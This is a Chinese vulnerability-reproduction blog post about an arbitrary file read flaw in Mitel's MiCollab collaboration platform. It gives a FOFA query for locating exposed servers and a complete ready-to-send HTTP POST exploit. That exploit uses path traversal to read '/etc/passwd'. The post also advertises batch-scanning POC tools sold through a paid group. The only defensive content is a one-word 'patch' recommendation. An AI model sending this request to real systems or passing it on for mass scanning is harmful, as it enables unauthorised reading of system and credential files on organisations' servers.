#  Mitel企业协作平台存在任意文件读取漏洞 附POC   
2025-3-25更新  南风漏洞复现文库   2025-03-25 23:23  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Mitel企业协作平台简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
Mitel企业协作平台  
## 2.漏洞描述  
  
Mitel企业协作平台存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
Mitel企业协作平台  
  
![Mitel企业协作平台存在任意文件读取漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3Yc6nwAcD8G9qiaBpbrjEWRSOLMgaDYY6JBFic37OveNECD1qNmUMTme8qdiam3FB0jKd2NqW7bA6LeQ/640?wx_fmt=png&from=appmsg "null")  
  
Mitel企业协作平台存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="MiCollab End User Portal"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2  
  
漏洞数据包：  
```
POST /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Length: 683
Content-Type: application/x-www-form-urlencoded

_transaction=<transaction xmlns:xsi="http://www.w3.org/2000/10/XMLSchema-instance" xsi:type="xsd:Object"><transactionNum xsi:type="xsd:long">2</transactionNum><operations xsi:type="xsd:List"><elem xsi:type="xsd:Object"><criteria xsi:type="xsd:Object"><reportName>../../../etc/passwd</reportName></criteria><operationConfig xsi:type="xsd:Object"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type="xsd:Object"><reportName>x.txt</reportName></oldValues></elem></operations><jscallback>x</jscallback></transaction>&protocolVersion=1.0&__iframeTarget__=x
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yc6nwAcD8G9qiaBpbrjEWRSkPEJsVIPVxkCnQZTUHnpaia5aD2e8CcWQKqicVVTQf9GtcsRSGIaUWDg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yc6nwAcD8G9qiaBpbrjEWRSpnhMVqFq1F1oueCZnt4mxlScyG651GLX3R1AU5H7quQwlTLMPyyl2A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yc6nwAcD8G9qiaBpbrjEWRSPtibAic6iaia3ff1HxZpv4ibgLibqibFpFAjCnRjKSPl9A7LKu7zBZJVfERGw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yc6nwAcD8G9qiaBpbrjEWRSjJezSrV9riawJvwiaI2LqsAic6STO3zMibBuwP3h7qtOXr9h4W1wY1KQ7w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yc6nwAcD8G9qiaBpbrjEWRSFfA6ic3VTCeFxQHWyu2ItRckjuJfia0wL3kSynvUYV4iazDhq8Y3yl1JA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yc6nwAcD8G9qiaBpbrjEWRSfAHZiaff5RIHBBRLEolgDP9XicbEg4xUVxXkYmclia06mwJPbGDicPE8AA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
  
